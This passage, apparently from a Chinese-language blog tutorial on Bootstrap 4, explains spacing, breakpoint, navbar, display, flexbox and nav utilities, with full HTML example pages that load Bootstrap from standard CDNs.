p-3\"&gt;P3&lt;/button&gt; &lt;button class=\"btn btn-info p-4\"&gt;P4&lt;/button&gt; &lt;button class=\"btn btn-info p-5\"&gt;P5&lt;/button&gt; &lt;!-- Padding --&gt; &lt;!-- 上 --&gt; &lt;button class=\"btn btn-info pt-5\"&gt;Pt-5&lt;/button&gt; &lt;!-- 下 --&gt; &lt;button class=\"btn btn-info pb-5\"&gt;Pb-5&lt;/button&gt; &lt;!-- 上下 --&gt; &lt;button class=\"btn btn-info py-5\"&gt;Py-5&lt;/button&gt; &lt;!-- 左 --&gt; &lt;button class=\"btn btn-info pl-5\"&gt;Pl-5&lt;/button&gt; &lt;!-- 右 --&gt; &lt;button class=\"btn btn-info pr-5\"&gt;Pr-5&lt;/button&gt; &lt;!-- 左右 --&gt; &lt;button class=\"btn btn-info px-5\"&gt;Px-5&lt;/button&gt; &lt;!-- Margin --&gt; &lt;p class=\"bg-success text-white m-0\"&gt;I AM M-0&lt;/p&gt; &lt;p class=\"bg-success text-white m-1\"&gt;I AM M-1&lt;/p&gt; &lt;p class=\"bg-success text-white m-2\"&gt;I AM M-2&lt;/p&gt; &lt;p class=\"bg-success text-white m-3\"&gt;I AM M-3&lt;/p&gt; &lt;p class=\"bg-success text-white m-4\"&gt;I AM M-4&lt;/p&gt; &lt;p class=\"bg-success text-white m-5\"&gt;I AM M-5&lt;/p&gt; &lt;/div&gt; &lt;!-- Optional JavaScript --&gt; &lt;!-- jQuery first, then Popper.js, then Bootstrap JS --&gt; &lt;script src=\"https://code.jquery.com/jquery-3.3.1.slim.min.js\" integrity=\"sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo\" crossorigin=\"anonymous\"&gt;&lt;/script&gt; &lt;script src=\"https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js\" integrity=\"sha384-ZMP7rVo3mIykV+2+9J3UJ46jBk0WLaUAdn689aCwoqbBJiSnjAK/l8WvCWPIPm49\" crossorigin=\"anonymous\"&gt;&lt;/script&gt; &lt;script src=\"https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js\" integrity=\"sha384-ChfqqxuZUCnJSK3+MXmPNIyE6ZbWh2IMqE241rYiqJxyMiZ6OW/JmZQ5stwEULTy\" crossorigin=\"anonymous\"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; breakpoints 与 padding margin 混合使用 bootstrap4有5个breakpoints：https://getbootstrap.com/docs/4.2/layout/overview/ 分别为：xs(最小，一般不写)，sm,md,lg,xl breakpoints 与 padding margin 混合使用: {property}{sides}-{breakpoint}-{size} padding and margin：https://getbootstrap.com/docs/4.2/utilities/spacing/ 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;!doctype html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;!-- Required meta tags --&gt; &lt;meta charset=\"utf-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, shrink-to-fit=no\"&gt; &lt;!-- Bootstrap CSS --&gt; &lt;link rel=\"stylesheet\" href=\"https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css\" integrity=\"sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO\" crossorigin=\"anonymous\"&gt; &lt;title&gt;Breakpoints&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=\"container text-center\"&gt; &lt;h1 class=\"display-3\"&gt;Breakpoints&lt;/h1&gt; &lt;button class=\"btn btn-warning p-sm-5 p-md-0 p-lg-5 p-xl-0\"&gt;BUTTON&lt;/button&gt; &lt;button class=\"btn btn-danger p-0 p-sm-2 p-md-3 p-lg-4 p-xl-5\"&gt;BUTTON&lt;/button&gt; &lt;button class=\"btn btn-success p-0 pl-sm-5 pt-md-5 pr-lg-5 pb-xl-5\"&gt;BUTTON&lt;/button&gt; &lt;h1&gt;Margin Example&lt;/h1&gt; &lt;button class=\"btn btn-primary p-4 mx-0 mx-sm-2 mx-md-3 mx-lg-4 mx-xl-5\"&gt;Hi&lt;/button&gt; &lt;button class=\"btn btn-primary p-4 mx-0 mx-sm-2 mx-md-3 mx-lg-4 mx-xl-5\"&gt;Hi&lt;/button&gt; &lt;button class=\"btn btn-primary p-4 mx-0 mx-sm-2 mx-md-3 mx-lg-4 mx-xl-5\"&gt;Hi&lt;/button&gt; &lt;button class=\"btn btn-primary p-4 mx-0 mx-sm-2 mx-md-3 mx-lg-4 mx-xl-5\"&gt;Hi&lt;/button&gt; &lt;/div&gt; &lt;!-- Optional JavaScript --&gt; &lt;!-- jQuery first, then Popper.js, then Bootstrap JS --&gt; &lt;script src=\"https://code.jquery.com/jquery-3.3.1.slim.min.js\" integrity=\"sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo\" crossorigin=\"anonymous\"&gt;&lt;/script&gt; &lt;script src=\"https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js\" integrity=\"sha384-ZMP7rVo3mIykV+2+9J3UJ46jBk0WLaUAdn689aCwoqbBJiSnjAK/l8WvCWPIPm49\" crossorigin=\"anonymous\"&gt;&lt;/script&gt; &lt;script src=\"https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js\" integrity=\"sha384-ChfqqxuZUCnJSK3+MXmPNIyE6ZbWh2IMqE241rYiqJxyMiZ6OW/JmZQ5stwEULTy\" crossorigin=\"anonymous\"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 导航栏 相对于bootstrap3，导航兰增加了breakpoint，navbar-expand-XX根据分辨率不同发生不同的变化。 下面列出了不同分辨率的导航栏，在浏览器中去尝试！ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205&lt;!doctype html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;!-- Required meta tags --&gt; &lt;meta charset=\"utf-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, shrink-to-fit=no\"&gt; &lt;!-- Bootstrap CSS --&gt; &lt;link rel=\"stylesheet\" href=\"https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css\" integrity=\"sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO\" crossorigin=\"anonymous\"&gt; &lt;title&gt;Navbars&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=\"container\"&gt; &lt;h1 class=\"text-center display-3\"&gt;Navbars&lt;/h1&gt; &lt;/div&gt; &lt;nav class=\"navbar navbar-expand-sm navbar-light bg-light\"&gt; &lt;a class=\"navbar-brand\" href=\"#\"&gt;Expands at SM&lt;/a&gt; &lt;button class=\"navbar-toggler\" type=\"button\" data-toggle=\"collapse\" data-target=\"#navbarSupportedContent\" aria-controls=\"navbarSupportedContent\" aria-expanded=\"false\" aria-label=\"Toggle navigation\"&gt; &lt;span class=\"navbar-toggler-icon\"&gt;&lt;/span&gt; &lt;/button&gt; &lt;div class=\"collapse navbar-collapse\" id=\"navbarSupportedContent\"&gt; &lt;ul class=\"navbar-nav mr-auto\"&gt; &lt;li class=\"nav-item active\"&gt; &lt;a class=\"nav-link\" href=\"#\"&gt;Home &lt;span class=\"sr-only\"&gt;(current)&lt;/span&gt;&lt;/a&gt; &lt;/li&gt; &lt;li class=\"nav-item\"&gt; &lt;a class=\"nav-link\" href=\"#\"&gt;Link&lt;/a&gt; &lt;/li&gt; &lt;li class=\"nav-item dropdown\"&gt; &lt;a class=\"nav-link dropdown-toggle\" href=\"#\" id=\"navbarDropdown\" role=\"button\" data-toggle=\"dropdown\" aria-haspopup=\"true\" aria-expanded=\"false\"&gt; Dropdown &lt;/a&gt; &lt;div class=\"dropdown-menu\" aria-labelledby=\"navbarDropdown\"&gt; &lt;a class=\"dropdown-item\" href=\"#\"&gt;Action&lt;/a&gt; &lt;a class=\"dropdown-item\" href=\"#\"&gt;Another action&lt;/a&gt; &lt;div class=\"dropdown-divider\"&gt;&lt;/div&gt; &lt;a class=\"dropdown-item\" href=\"#\"&gt;Something else here&lt;/a&gt; &lt;/div&gt; &lt;/li&gt; &lt;li class=\"nav-item\"&gt; &lt;a class=\"nav-link disabled\" href=\"#\"&gt;Disabled&lt;/a&gt; &lt;/li&gt; &lt;/ul&gt; &lt;form class=\"form-inline my-2 my-lg-0\"&gt; &lt;input class=\"form-control mr-sm-2\" type=\"search\" placeholder=\"Search\" aria-label=\"Search\"&gt; &lt;button class=\"btn btn-outline-success my-2 my-sm-0\" type=\"submit\"&gt;Search&lt;/button&gt; &lt;/form&gt; &lt;/div&gt; &lt;/nav&gt; &lt;nav class=\"navbar navbar-expand-md navbar-light bg-light\"&gt; &lt;a class=\"navbar-brand\" href=\"#\"&gt;Expands at MD&lt;/a&gt; &lt;button class=\"navbar-toggler\" type=\"button\" data-toggle=\"collapse\" data-target=\"#navbarSupportedContent\" aria-controls=\"navbarSupportedContent\" aria-expanded=\"false\" aria-label=\"Toggle navigation\"&gt; &lt;span class=\"navbar-toggler-icon\"&gt;&lt;/span&gt; &lt;/button&gt; &lt;div class=\"collapse navbar-collapse\" id=\"navbarSupportedContent\"&gt; &lt;ul class=\"navbar-nav mr-auto\"&gt; &lt;li class=\"nav-item active\"&gt; &lt;a class=\"nav-link\" href=\"#\"&gt;Home &lt;span class=\"sr-only\"&gt;(current)&lt;/span&gt;&lt;/a&gt; &lt;/li&gt; &lt;li class=\"nav-item\"&gt; &lt;a class=\"nav-link\" href=\"#\"&gt;Link&lt;/a&gt; &lt;/li&gt; &lt;li class=\"nav-item dropdown\"&gt; &lt;a class=\"nav-link dropdown-toggle\" href=\"#\" id=\"navbarDropdown\" role=\"button\" data-toggle=\"dropdown\" aria-haspopup=\"true\" aria-expanded=\"false\"&gt; Dropdown &lt;/a&gt; &lt;div class=\"dropdown-menu\" aria-labelledby=\"navbarDropdown\"&gt; &lt;a class=\"dropdown-item\" href=\"#\"&gt;Action&lt;/a&gt; &lt;a class=\"dropdown-item\" href=\"#\"&gt;Another action&lt;/a&gt; &lt;div class=\"dropdown-divider\"&gt;&lt;/div&gt; &lt;a class=\"dropdown-item\" href=\"#\"&gt;Something else here&lt;/a&gt; &lt;/div&gt; &lt;/li&gt; &lt;li class=\"nav-item\"&gt; &lt;a class=\"nav-link disabled\" href=\"#\"&gt;Disabled&lt;/a&gt; &lt;/li&gt; &lt;/ul&gt; &lt;form class=\"form-inline my-2 my-lg-0\"&gt; &lt;input class=\"form-control mr-sm-2\" type=\"search\" placeholder=\"Search\" aria-label=\"Search\"&gt; &lt;button class=\"btn btn-outline-success my-2 my-sm-0\" type=\"submit\"&gt;Search&lt;/button&gt; &lt;/form&gt; &lt;/div&gt; &lt;/nav&gt; &lt;nav class=\"navbar navbar-expand-lg navbar-light bg-light\"&gt; &lt;a class=\"navbar-brand\" href=\"#\"&gt;Expands at LG&lt;/a&gt; &lt;button class=\"navbar-toggler\" type=\"button\" data-toggle=\"collapse\" data-target=\"#navbarSupportedContent\" aria-controls=\"navbarSupportedContent\" aria-expanded=\"false\" aria-label=\"Toggle navigation\"&gt; &lt;span class=\"navbar-toggler-icon\"&gt;&lt;/span&gt; &lt;/button&gt; &lt;div class=\"collapse navbar-collapse\" id=\"navbarSupportedContent\"&gt; &lt;ul class=\"navbar-nav mr-auto\"&gt; &lt;li class=\"nav-item active\"&gt; &lt;a class=\"nav-link\" href=\"#\"&gt;Home &lt;span class=\"sr-only\"&gt;(current)&lt;/span&gt;&lt;/a&gt; &lt;/li&gt; &lt;li class=\"nav-item\"&gt; &lt;a class=\"nav-link\" href=\"#\"&gt;Link&lt;/a&gt; &lt;/li&gt; &lt;li class=\"nav-item dropdown\"&gt; &lt;a class=\"nav-link dropdown-toggle\" href=\"#\" id=\"navbarDropdown\" role=\"button\" data-toggle=\"dropdown\" aria-haspopup=\"true\" aria-expanded=\"false\"&gt; Dropdown &lt;/a&gt; &lt;div class=\"dropdown-menu\" aria-labelledby=\"navbarDropdown\"&gt; &lt;a class=\"dropdown-item\" href=\"#\"&gt;Action&lt;/a&gt; &lt;a class=\"dropdown-item\" href=\"#\"&gt;Another action&lt;/a&gt; &lt;div class=\"dropdown-divider\"&gt;&lt;/div&gt; &lt;a class=\"dropdown-item\" href=\"#\"&gt;Something else here&lt;/a&gt; &lt;/div&gt; &lt;/li&gt; &lt;li class=\"nav-item\"&gt; &lt;a class=\"nav-link disabled\" href=\"#\"&gt;Disabled&lt;/a&gt; &lt;/li&gt; &lt;/ul&gt; &lt;form class=\"form-inline my-2 my-lg-0\"&gt; &lt;input class=\"form-control mr-sm-2\" type=\"search\" placeholder=\"Search\" aria-label=\"Search\"&gt; &lt;button class=\"btn btn-outline-success my-2 my-sm-0\" type=\"submit\"&gt;Search&lt;/button&gt; &lt;/form&gt; &lt;/div&gt; &lt;/nav&gt; &lt;nav class=\"navbar navbar-expand-xl navbar-light bg-light\"&gt; &lt;a class=\"navbar-brand\" href=\"#\"&gt;Expands at XL&lt;/a&gt; &lt;button class=\"navbar-toggler\" type=\"button\" data-toggle=\"collapse\" data-target=\"#navbarSupportedContent\" aria-controls=\"navbarSupportedContent\" aria-expanded=\"false\" aria-label=\"Toggle navigation\"&gt; &lt;span class=\"navbar-toggler-icon\"&gt;&lt;/span&gt; &lt;/button&gt; &lt;div class=\"collapse navbar-collapse\" id=\"navbarSupportedContent\"&gt; &lt;ul class=\"navbar-nav mr-auto\"&gt; &lt;li class=\"nav-item active\"&gt; &lt;a class=\"nav-link\" href=\"#\"&gt;Home &lt;span class=\"sr-only\"&gt;(current)&lt;/span&gt;&lt;/a&gt; &lt;/li&gt; &lt;li class=\"nav-item\"&gt; &lt;a class=\"nav-link\" href=\"#\"&gt;Link&lt;/a&gt; &lt;/li&gt; &lt;li class=\"nav-item dropdown\"&gt; &lt;a class=\"nav-link dropdown-toggle\" href=\"#\" id=\"navbarDropdown\" role=\"button\" data-toggle=\"dropdown\" aria-haspopup=\"true\" aria-expanded=\"false\"&gt; Dropdown &lt;/a&gt; &lt;div class=\"dropdown-menu\" aria-labelledby=\"navbarDropdown\"&gt; &lt;a class=\"dropdown-item\" href=\"#\"&gt;Action&lt;/a&gt; &lt;a class=\"dropdown-item\" href=\"#\"&gt;Another action&lt;/a&gt; &lt;div class=\"dropdown-divider\"&gt;&lt;/div&gt; &lt;a class=\"dropdown-item\" href=\"#\"&gt;Something else here&lt;/a&gt; &lt;/div&gt; &lt;/li&gt; &lt;li class=\"nav-item\"&gt; &lt;a class=\"nav-link disabled\" href=\"#\"&gt;Disabled&lt;/a&gt; &lt;/li&gt; &lt;/ul&gt; &lt;form class=\"form-inline my-2 my-lg-0\"&gt; &lt;input class=\"form-control mr-sm-2\" type=\"search\" placeholder=\"Search\" aria-label=\"Search\"&gt; &lt;button class=\"btn btn-outline-success my-2 my-sm-0\" type=\"submit\"&gt;Search&lt;/button&gt; &lt;/form&gt; &lt;/div&gt; &lt;/nav&gt; &lt;nav class=\"navbar navbar-expand-xl navbar-dark bg-info\"&gt; &lt;a class=\"navbar-brand\" href=\"#\"&gt;Navbar-Dark&lt;/a&gt; &lt;button class=\"navbar-toggler\" type=\"button\" data-toggle=\"collapse\" data-target=\"#navbarSupportedContent\" aria-controls=\"navbarSupportedContent\" aria-expanded=\"false\" aria-label=\"Toggle navigation\"&gt; &lt;span class=\"navbar-toggler-icon\"&gt;&lt;/span&gt; &lt;/button&gt; &lt;div class=\"collapse navbar-collapse\" id=\"navbarSupportedContent\"&gt; &lt;ul class=\"navbar-nav mr-auto\"&gt; &lt;li class=\"nav-item active\"&gt; &lt;a class=\"nav-link\" href=\"#\"&gt;Home &lt;span class=\"sr-only\"&gt;(current)&lt;/span&gt;&lt;/a&gt; &lt;/li&gt; &lt;li class=\"nav-item\"&gt; &lt;a class=\"nav-link\" href=\"#\"&gt;Link&lt;/a&gt; &lt;/li&gt; &lt;li class=\"nav-item\"&gt; &lt;a class=\"nav-link disabled\" href=\"#\"&gt;Disabled&lt;/a&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/nav&gt; &lt;!-- Optional JavaScript --&gt; &lt;!-- jQuery first, then Popper.js, then Bootstrap JS --&gt; &lt;script src=\"https://code.jquery.com/jquery-3.3.1.slim.min.js\" integrity=\"sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo\" crossorigin=\"anonymous\"&gt;&lt;/script&gt; &lt;script src=\"https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js\" integrity=\"sha384-ZMP7rVo3mIykV+2+9J3UJ46jBk0WLaUAdn689aCwoqbBJiSnjAK/l8WvCWPIPm49\" crossorigin=\"anonymous\"&gt;&lt;/script&gt; &lt;script src=\"https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js\" integrity=\"sha384-ChfqqxuZUCnJSK3+MXmPNIyE6ZbWh2IMqE241rYiqJxyMiZ6OW/JmZQ5stwEULTy\" crossorigin=\"anonymous\"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; display 隐藏与显示 结合breakpoint 还可以设置inline 与 block ：https://getbootstrap.com/docs/4.2/utilities/display/ 在浏览器中拖动大小显示效果。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546&lt;!doctype html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;!-- Required meta tags --&gt; &lt;meta charset=\"utf-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, shrink-to-fit=no\"&gt; &lt;!-- Bootstrap CSS --&gt; &lt;link rel=\"stylesheet\" href=\"https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css\" integrity=\"sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO\" crossorigin=\"anonymous\"&gt; &lt;title&gt;Display&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=\"container\"&gt; &lt;h1 class=\"text-center display-4\"&gt;Display Utility&lt;/h1&gt; &lt;h1 class=\"border border-danger d-inline\"&gt;HELLO&lt;/h1&gt; &lt;span class=\"border border-success d-block\"&gt;HELLO&lt;/span&gt; &lt;h1 class=\"d-xl-none\"&gt;HIDE ME ON XL&lt;/h1&gt; &lt;h1 class=\"d-none d-lg-block d-xl-none\"&gt;ALWAYS HIDDEN EXCEPT LG&lt;/h1&gt; &lt;/div&gt; &lt;div class=\"container\"&gt; &lt;div class=\"jumbotron\"&gt; &lt;h1 class=\"display-4\"&gt;Hello, world!&lt;/h1&gt; &lt;p class=\"lead d-none d-md-block\"&gt;Lorem, ipsum dolor sit amet consectetur adipisicing elit. Quis odio debitis voluptatem possimus corrupti labore alias! Ad ipsa, veniam in quo a aperiam obcaecati quae. Blanditiis delectus, corrupti optio voluptatem eum deserunt officiis vitae. Similique amet facere voluptas velit maxime neque, quisquam exercitationem aliquam vitae inventore cumque ad nihil sit expedita fugiat at, quos quae. Aperiam obcaecati aut magni veritatis!&lt;/p&gt; &lt;hr class=\"my-4\"&gt; &lt;p&gt;It uses utility classes for typography and spacing to space content out within the larger container.&lt;/p&gt; &lt;a class=\"btn btn-primary btn-lg\" href=\"#\" role=\"button\"&gt;Learn more&lt;/a&gt; &lt;/div&gt; &lt;/div&gt; &lt;!-- Optional JavaScript --&gt; &lt;!-- jQuery first, then Popper.js, then Bootstrap JS --&gt; &lt;script src=\"https://code.jquery.com/jquery-3.3.1.slim.min.js\" integrity=\"sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo\" crossorigin=\"anonymous\"&gt;&lt;/script&gt; &lt;script src=\"https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js\" integrity=\"sha384-ZMP7rVo3mIykV+2+9J3UJ46jBk0WLaUAdn689aCwoqbBJiSnjAK/l8WvCWPIPm49\" crossorigin=\"anonymous\"&gt;&lt;/script&gt; &lt;script src=\"https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js\" integrity=\"sha384-ChfqqxuZUCnJSK3+MXmPNIyE6ZbWh2IMqE241rYiqJxyMiZ6OW/JmZQ5stwEULTy\" crossorigin=\"anonymous\"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; flexBox https://getbootstrap.com/docs/4.2/utilities/flex/ flexBox在布局的时候非常有用。 d-flex声明盒子是一个flexbox flex-row表明盒子上下扩展 flex-column表明盒子左右扩展 flex-column-reverse、flex-row-reverse 镜像反转。 justify-content-start原本大小，不扩展 主坐标轴的排列 align-items-end 、justify-content-between、justify-content-around排列位置，这是次坐标轴的排列 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364&lt;!doctype html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;!-- Required meta tags --&gt; &lt;meta charset=\"utf-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, shrink-to-fit=no\"&gt; &lt;!-- Bootstrap CSS --&gt; &lt;link rel=\"stylesheet\" href=\"https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css\" integrity=\"sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO\" crossorigin=\"anonymous\"&gt; &lt;title&gt;Flexbox&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=\"container\"&gt; &lt;h1 class=\"text-center display-4\"&gt;Flexbox&lt;/h1&gt; &lt;div class=\"border border-dark d-flex flex-row justify-content-start align-items-end\" style=\"height: 200px\"&gt; &lt;button class=\"btn btn-info btn-lg\"&gt;LARGE&lt;/button&gt; &lt;button class=\"btn btn-primary\"&gt;SMALL&lt;/button&gt; &lt;button class=\"btn btn-warning\"&gt;SMALL&lt;/button&gt; &lt;/div&gt; &lt;div class=\"border border-dark d-flex flex-row-reverse justify-content-start align-items-end\" style=\"height: 200px\"&gt; &lt;button class=\"btn btn-info btn-lg\"&gt;LARGE&lt;/button&gt; &lt;button class=\"btn btn-primary\"&gt;SMALL&lt;/button&gt; &lt;button class=\"btn btn-warning\"&gt;SMALL&lt;/button&gt; &lt;/div&gt; &lt;div class=\"border border-dark d-flex flex-column justify-content-start align-items-end\" style=\"height: 200px\"&gt; &lt;button class=\"btn btn-info btn-lg\"&gt;LARGE&lt;/button&gt; &lt;button class=\"btn btn-primary\"&gt;SMALL&lt;/button&gt; &lt;button class=\"btn btn-warning\"&gt;SMALL&lt;/button&gt; &lt;/div&gt; &lt;div class=\"border border-dark d-flex flex-column-reverse justify-content-start align-items-end\" style=\"height: 200px\"&gt; &lt;button class=\"btn btn-info btn-lg\"&gt;LARGE&lt;/button&gt; &lt;button class=\"btn btn-primary\"&gt;SMALL&lt;/button&gt; &lt;button class=\"btn btn-warning\"&gt;SMALL&lt;/button&gt; &lt;/div&gt; &lt;h1 class=\"display-4 text-center\"&gt;EXAMPLE TIME&lt;/h1&gt; &lt;div class=\"d-flex flex-column flex-md-row justify-content-between\"&gt; &lt;button class=\"btn btn-dark btn-lg\"&gt;Link 1&lt;/button&gt; &lt;button class=\"btn btn-dark btn-lg\"&gt;Link 2&lt;/button&gt; &lt;button class=\"btn btn-dark btn-lg\"&gt;Link 3&lt;/button&gt; &lt;button class=\"btn btn-dark btn-lg\"&gt;Link 4&lt;/button&gt; &lt;button class=\"btn btn-dark btn-lg\"&gt;Link 5&lt;/button&gt; &lt;button class=\"btn btn-dark btn-lg\"&gt;Link 6&lt;/button&gt; &lt;/div&gt; &lt;/div&gt; &lt;!-- Optional JavaScript --&gt; &lt;!-- jQuery first, then Popper.js, then Bootstrap JS --&gt; &lt;script src=\"https://code.jquery.com/jquery-3.3.1.slim.min.js\" integrity=\"sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo\" crossorigin=\"anonymous\"&gt;&lt;/script&gt; &lt;script src=\"https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js\" integrity=\"sha384-ZMP7rVo3mIykV+2+9J3UJ46jBk0WLaUAdn689aCwoqbBJiSnjAK/l8WvCWPIPm49\" crossorigin=\"anonymous\"&gt;&lt;/script&gt; &lt;script src=\"https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js\" integrity=\"sha384-ChfqqxuZUCnJSK3+MXmPNIyE6ZbWh2IMqE241rYiqJxyMiZ6OW/JmZQ5stwEULTy\" crossorigin=\"anonymous\"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; NAV + flexBox 1、NAV相对于bootstrap3做了分离： Instead of HTML-specific selectors like .nav &gt; li &gt; a, we use separate classes for .navs, .nav-items, and .nav-links. This makes your HTML more flexible while bringing along increased extensibility. 2、NAV默认是flexbox。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364&lt;!doctype html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;!-- Required meta tags --&gt; &lt;meta charset=\"utf-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, shrink-to-fit=no\"&gt; &lt;!-- Bootstrap CSS --&gt; &lt;link rel=\"stylesheet\" href=\"https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css\" integrity=\"sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO\" crossorigin=\"anonymous\"&gt; &lt;title&gt;Navs&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=\"container\"&gt; &lt;h1 class=\"text-center display-4\"&gt;Navs+Flex&lt;/h1&gt; &lt;ul class=\"nav border border-primary justify-content-around\"&gt; &lt;li class=\"nav-item\"&gt; &lt;a class=\"nav-link active\" href=\"#\"&gt;Active&lt;/a&gt; &lt;/li&gt; &lt;li class=\"nav-item\"&gt; &lt;a class=\"nav-link\" href=\"#\"&gt;Link&lt;/a&gt; &lt;/li&gt; &lt;li class=\"nav-item\"&gt; &lt;a class=\"nav-link\" href=\"#\"&gt;Link&lt;/a&gt; &lt;/li&gt; &lt;li class=\"nav-item\"&gt; &lt;a class=\"nav-link disabled\" href=\"#\"&gt;Disabled&lt;/a&gt; &lt;/li&gt; &lt;/ul&gt; &lt;ul class=\"nav nav-tabs mt-5 \"&gt; &lt;li class=\"nav-item\"&gt; &lt;a class=\"nav-link active\" href=\"#\"&gt;Active&lt;/a&gt; &lt;/li&gt; &lt;li class=\"nav-item\"&gt; &lt;a class=\"nav-link\" href=\"#\"&gt;Link&lt;/a&gt; &lt;/li&gt; &lt;li class=\"nav-item\"&gt; &lt;a class=\"nav-link\" href=\"#\"&gt;Link&lt;/a&gt; &lt;/li&gt; &lt;li class=\"nav-item\"&gt; &lt;a class=\"nav-link disabled\" href=\"#\"&gt;Disabled&lt;/a&gt; &lt;/li&gt; &lt;/ul&gt; &lt;nav class=\"nav flex-column flex-sm-row justify-content-center align-items-center\"&gt; &lt;a class=\"nav-link active\" href=\"#\"&gt;Active&lt;/a&gt; &lt;a class=\"nav-link\" href=\"#\"&gt;Link&lt;/a&gt; &lt;a class=\"nav-link\" href=\"#\"&gt;Link&lt;/a&gt; &lt;a class=\"nav-link disabled\" href=\"#\"&gt;Disabled&lt;/a&gt; &lt;/nav&gt; &lt;/div&gt; &lt;!-- Optional JavaScript --&gt; &lt;!-- jQuery first, then Popper.js, then Bootstrap JS --&gt; &lt;script src=\"https://code.jquery.com/jquery-3.3.1.slim.min.js\" integrity=\"sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo\" crossorigin=\"anonymous\"&gt;&lt;/script&gt; &lt;script src=\"https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js\" integrity=\"sha384-ZMP7rVo3mIykV+2+9J3UJ46jBk0WLaUAdn689aCwoqbBJiSnjAK/l8WvCWPIPm49\" crossorigin=\"anonymous\"&gt;&lt;/script&gt; &lt;script src=\"https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js\" integrity=\"sha384-ChfqqxuZUCnJSK3+MXmPNIyE6ZbWh2IMqE241rYiqJxyMiZ6OW/JmZQ5stwEULTy\" crossorigin=\"anonymous\"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; bootstrap4 grid https://getbootstrap.com/docs/4.2/migration/#grid-system 增加了极小的屏幕xs, sm, md, lg, and xl. 123456789101112131415161718192021222324252627282930313233343536373839&lt;!doctype html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;!-- Required meta tags --&gt; &lt;meta charset=\"utf-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, shrink-to-fit=no\"&gt; &lt;!-- Bootstrap CSS --&gt; &lt;link rel=\"stylesheet\" href=\"https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css\" integrity=\"sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO\" 